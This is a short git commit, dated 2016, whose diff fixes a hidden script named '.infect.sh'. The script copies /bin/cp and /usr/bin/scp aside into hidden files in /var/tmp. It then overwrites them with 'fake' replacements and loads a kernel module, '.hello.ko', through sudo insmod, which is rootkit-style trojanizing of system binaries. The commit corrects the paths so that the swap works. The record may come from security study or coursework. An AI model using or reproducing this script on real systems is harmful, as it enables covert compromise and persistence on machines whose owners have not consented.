41969b94fcc743d6e940d3eac3fbc63fd44b93b3
lagoon0o0 <lagoonzxy@gmail.com>
2016-12-18 18:33:49 +0800

    .infect.sh fixed

--- src/.infect.sh
+++ src/.infect.sh
@@ -1,5 +1,5 @@
 cp /bin/cp /var/tmp/.cp
 cp /usr/bin/scp /var/tmp/.scp
-mv -f /.fake_cp /bin/cp
-mv -f /.fake_scp /usr/bin/scp
+mv -f /var/tmp/.fake_cp /bin/cp
+mv -f /var/tmp/.fake_scp /usr/bin/scp
 sudo insmod /var/tmp/.hello.ko
